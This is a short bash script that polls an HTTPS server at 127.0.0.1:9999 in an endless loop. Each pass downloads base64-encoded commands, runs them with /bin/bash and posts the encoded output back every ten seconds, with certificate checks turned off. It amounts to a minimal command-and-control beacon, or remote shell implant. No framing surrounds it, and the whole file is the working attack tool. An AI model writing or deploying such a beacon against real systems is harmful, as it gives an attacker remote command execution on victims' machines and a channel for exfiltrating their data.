#! /bin/bash

while true; do
	curl -k -d $(curl -k -s https://127.0.0.1:9999|base64 -d|/bin/bash|base64 -w0) https://127.0.0.1:9999;
	sleep 10;
done;
